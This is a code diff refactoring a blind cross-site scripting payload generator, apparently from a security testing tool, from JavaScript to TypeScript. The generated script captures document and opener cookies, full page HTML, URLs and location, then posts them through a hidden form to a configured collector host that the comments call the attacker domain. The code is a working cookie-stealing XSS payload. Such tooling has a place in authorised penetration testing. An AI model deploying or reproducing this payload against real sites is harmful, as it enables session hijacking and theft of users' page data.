@@ -1,25 +1,39 @@
+import config from '../../config';
+
+const { url, intrusiveLevel, boundary  } = config;
+
 // As some companies might not want all of their innerHTML/Cookies to be leaked to a third-party
 // This acts as a barrier, by default config.intrusiveLevel is set to 0, which means
 // We will only capture relevant information about the host, and report it
 // Sets elements
-function determineInstrusive(config) {
-  const capture = {};
-  capture.cookie = config.intrusiveLevel === 1 ? 'document.cookie' : 'null';
-  capture.documentBody =
-    config.intrusiveLevel === 1
-      ? 'document.body.parentNode.innerHTML'
-      : 'identifyTagAndCaptureParentNodes(document.getElementsByTagName("script"))';
-  capture.url = config.intrusiveLevel === 1 ? 'document.URL' : 'document.URL';
-  capture.location = config.intrusiveLevel === 1 ? 'opener.location' : 'opener.location';
-  capture.openerBody = config.intrusiveLevel === 1 ? 'opener.document.body.innerHTML' : 'null';
-  capture.openerCookie = config.intrusiveLevel === 1 ? 'opener.document.cookie' : 'null';
-  return capture;
+
+interface Document { 
+      cookie: string;
+      documentBody: string;
+      url: string;
+      location: string;
+      openerBody: string;
+      openerCookie: string;
+}
+
+function determineInstrusive() {
+      let capture: Document = {
+      cookie: intrusiveLevel === 1 ? 'document.cookie' : 'null',
+      documentBody: intrusiveLevel === 1
+            ? 'document.body.parentNode.innerHTML'
+            : 'identifyTagAndCaptureParentNodes(document.getElementsByTagName("script"))',
+      url: intrusiveLevel === 1 ? 'document.URL' : 'document.URL',
+      location: intrusiveLevel === 1 ? 'opener.location' : 'opener.location',
+      openerBody: intrusiveLevel === 1 ? 'opener.document.body.innerHTML' : 'null',
+      openerCookie: intrusiveLevel === 1 ? 'opener.document.cookie' : 'null',
+      }
+      return capture
 }
 
 // Identifying the DOM of the page which was injected at non-intrusive level
 // First identify the correct script, where bXSS occured
 // Traverse the DOM until we hit the HTML (root element)
-function captureParentNodes(config) {
+function captureParentNodes() {
   return `
       function captureParentNodes(element, _array) {
             if (_array === undefined) {
@@ -41,7 +55,7 @@ function captureParentNodes(config) {
             var scriptLocation = ''
             for(i = 0;i < tagName.length; i++)
             {
-            if(tagName[i].src.indexOf('${config.url}/m')) {
+            if(tagName[i].src.indexOf('${url}/m')) {
                   scriptLocation = tagName[i]; 
             }
             }
@@ -81,7 +95,7 @@ function checkForSecurityTxt() {
 // Appends the data to the form, sets the URL as configured and sets the POST method
 // The form is then appended the body, window.name is set to __ to prevent loops
 // Data is then sent to the attacker domain to be processed
-function sendXhr(config) {
+function sendXhr() {
   return `
       var cScript = document.currentScript;   
 
@@ -100,15 +114,15 @@ function sendXhr(config) {
             var body = document.getElementsByTagName('body')[0];
 
             __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${
-              config.boundary
-            }'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${
-    config.boundary
-  }'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${
-    config.boundary
-  }'+odoc+'\\r\\n\\r\\n${config.boundary}'+stxt+'\\r\\n\\r\\n${config.boundary}'+pload));
+              boundary
+            }'+inne+'\\r\\n\\r\\n${boundary}'+durl+'\\r\\n\\r\\n${
+    boundary
+  }'+oloc+'\\r\\n\\r\\n${boundary}'+oloh+'\\r\\n\\r\\n${
+    boundary
+  }'+odoc+'\\r\\n\\r\\n${boundary}'+stxt+'\\r\\n\\r\\n${boundary}'+pload));
             __.setAttribute('name','_');
             _.appendChild(__);
-            _.action='//${config.url}/m';
+            _.action='//${url}/m';
             _.method='post';
 
             body.appendChild(_);
@@ -137,18 +151,18 @@ function captureInformation(capture) {
 // We check to see if the window.name is __ because by default it will not be
 // After a succesfull capture it will set the window.name to be __
 // This means it will only fire in that window once, preventing spam
-exports.generateTemplate = config => {
-  const capture = determineInstrusive(config);
+exports.generateTemplate = () => {
+  const capture = determineInstrusive();
   const template = `(function(){
         if(window.name!=='__'){
 
-            ${captureParentNodes(config)}
+            ${captureParentNodes()}
 
             ${checkForSecurityTxt()}
 
             ${captureInformation(capture)}
 
-            ${sendXhr(config)}
+            ${sendXhr()}
 
         } else {window.name='__'}
       })();`;
